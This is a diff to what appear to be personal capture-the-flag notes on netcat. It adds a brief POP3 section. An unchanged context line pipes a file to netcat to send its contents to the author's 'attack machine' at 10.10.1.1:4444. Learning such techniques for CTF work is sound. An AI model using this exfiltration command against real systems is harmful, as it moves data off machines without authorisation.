@@ -107,3 +107,9 @@ The sending is even easier than the above command. Here is the syntax:
 `cat output.txt | nc 10.10.1.1 4444`
 
 Cat will grab the text in output.txt and send it to my attack machine on port 4444.
+
+## POP3
+
+Netcat is the tool I use when interacting with POP3. I have a write up that details interacting with [POP3](pop3.md) in my tools section. It covers the some of the more common scenarios that I have found during capture the flag events.
+
+All the examples and interactions use netcat.
